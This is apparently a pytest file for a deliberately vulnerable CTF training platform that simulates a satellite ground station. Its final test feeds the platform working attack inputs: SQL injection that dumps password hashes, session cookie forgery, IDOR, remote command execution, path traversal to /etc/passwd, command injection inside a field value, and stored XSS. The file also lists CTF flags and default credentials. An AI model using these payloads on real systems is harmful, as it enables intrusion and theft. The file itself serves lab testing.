import base64
import hashlib
import json
import os
import tempfile
import time
from unittest.mock import MagicMock, patch
import pytest

from modules.core.ccsds import (
    build_tc,
    build_tm,
    ccsds_crc16,
    parse_frame,
    sdls_protect_frame,
    sdls_unprotect_frame,
)
from modules.core.constants import APID_TM_HEARTBEAT, APID_TC_COMMAND, TC_OP_PING
from modules.core.state import GroundStationState
from modules.webapp.config import TestConfig
from modules.webapp.db import init_db
from modules.webapp.seed import seed_db
from modules.webapp.app import create_app


@pytest.fixture
def app():
    db_fd, db_path = tempfile.mkstemp(suffix=".db")
    app_instance = create_app(TestConfig, db_path=db_path)
    with app_instance.app_context():
        init_db()
        seed_db()
        yield app_instance
    os.close(db_fd)
    if os.path.exists(db_path):
        os.unlink(db_path)


@pytest.fixture
def admin_client(app):
    client = app.test_client()
    client.post("/login", data={"username": "admin", "password": "password"})
    return client


def test_interop_difficulty_sync(app, admin_client):
    """Test that difficulty set via Webapp is reflected in GroundStationState and SDLS."""
    gs = app.config["GS_STATE"]
    assert gs.difficulty == 0

    mock_dev = MagicMock()
    mock_dev.send_shell_command_full.return_value = "difficulty: 2"
    gs.set_hardware(mock_dev)

    # Set difficulty via Webapp
    resp = admin_client.post("/api/satellite/difficulty", json={"difficulty": 2})
    assert resp.status_code == 200
    assert gs.difficulty == 2

    # Verify that a TC built under this state receives SDLS Level 2 (XOR) protection
    raw_tc = build_tc(APID_TC_COMMAND, bytes([TC_OP_PING]))
    protected = sdls_protect_frame(raw_tc, gs.difficulty)
    assert protected != raw_tc
    unprotected = sdls_unprotect_frame(protected, gs.difficulty)
    assert unprotected == raw_tc


def test_interop_sdls_level3_anti_replay_mechanics():
    """Test SDLS Level 3 encryption with dynamic MET and sequence verification."""
    ts = int(time.time()) & 0xFFFFFFFF
    tc1 = build_tc(APID_TC_COMMAND, bytes([TC_OP_PING]), seq_count=10, timestamp=ts)
    tc2 = build_tc(APID_TC_COMMAND, bytes([TC_OP_PING]), seq_count=11, timestamp=ts + 1)

    prot1 = sdls_protect_frame(tc1, 3)
    prot2 = sdls_protect_frame(tc2, 3)

    # Both must be encrypted and distinct
    assert prot1 != tc1
    assert prot2 != tc2
    assert prot1 != prot2

    # Verification of decryption
    unprot1 = sdls_unprotect_frame(prot1, 3)
    unprot2 = sdls_unprotect_frame(prot2, 3)
    assert unprot1 == tc1
    assert unprot2 == tc2

    pkt1 = parse_frame(unprot1)
    pkt2 = parse_frame(unprot2)
    assert pkt1.seq_count == 10
    assert pkt2.seq_count == 11
    assert pkt1.crc_valid
    assert pkt2.crc_valid


def test_interop_all_12_ctf_flags_accessible(app):
    """End-to-end verification that all 12 CTF challenge flags (GS-01 to GS-12) exist and are solvable."""
    client = app.test_client()

    # GS-12: API Enum
    r_enum = client.get("/api/endpoints")
    assert r_enum.status_code == 200

    r_flag12 = client.get("/api/debug/flags")
    assert r_flag12.status_code == 200
    assert "PWNSAT{API_NO_RATE_LIMIT_LVL1}" in r_flag12.get_json()["flag"]

    # GS-01: SQLi in Telemetry Search
    payload = "' UNION SELECT 1,username,password_hash,role,5,6,7,8,9,10,11,12,13 FROM users--"
    r_sqli = client.get(f"/api/telemetry?search={payload}&limit=100")
    assert r_sqli.status_code == 200
    assert any("5f4dcc3b" in str(list(row.values())) for row in r_sqli.get_json())

    # GS-05: Auth Bypass (Session Token Forging)
    forged_token = base64.b64encode(b"admin:admin:9999999999").decode()
    client.set_cookie("session_token", forged_token)
    r_panel = client.get("/api/admin/panel")
    assert r_panel.status_code == 200
    assert "PWNSAT{SESSION_TOKEN_FORGED_LVL1}" in r_panel.get_json()["flag"]

    # GS-06: IDOR (Access Admin Radio Config)
    # Login as operator
    client_op = app.test_client()
    client_op.post("/login", data={"username": "operator", "password": "operator123"})
    r_idor = client_op.get("/api/config/radio/1")
    assert r_idor.status_code == 200
    assert "PWNSAT{IDOR_ADMIN_CONFIG_LVL1}" in r_idor.get_json()["notes"]

    # GS-03: RCE via Diagnostics
    r_rce = client.post("/api/diagnostics", json={"cmd": "id"})
    assert r_rce.status_code == 200
    assert "uid=" in r_rce.get_json()["output"]

    # GS-04: LFI
    r_lfi = client.get("/api/logs", query_string={"file": "../" * 10 + "etc/passwd"})
    assert r_lfi.status_code == 200
    assert "root:" in r_lfi.get_json()["content"]

    # GS-07: CmdI in Radio Config
    r_cmdi = client.post("/api/config/radio", json={"frequency": "915000000; echo PWNED"})
    assert r_cmdi.status_code == 200
    assert "PWNED" in r_cmdi.get_json()["shell_output"]

    # GS-02: Stored XSS in Logs
    xss_script = '<script>alert("XSS")</script>'
    client.post("/api/logs", json={"message": xss_script})
    r_logs = client.get("/logs")
    assert r_logs.status_code == 200
    assert xss_script.encode() in r_logs.data

    # GS-11: Log Injection
    r_log_inject = client.post("/api/logs", json={"message": "Injected\n2026-08-19 FORGED LOG"})
    assert r_log_inject.status_code == 200

    # GS-08: Kill Chain Web-to-Space Link
    r_bridge = client.get("/api/radio/status")
    assert r_bridge.status_code == 200
    assert "PWNSAT{WEB_TO_SPACE_LINK_LVL1}" in r_bridge.get_json()["bridge_key"]
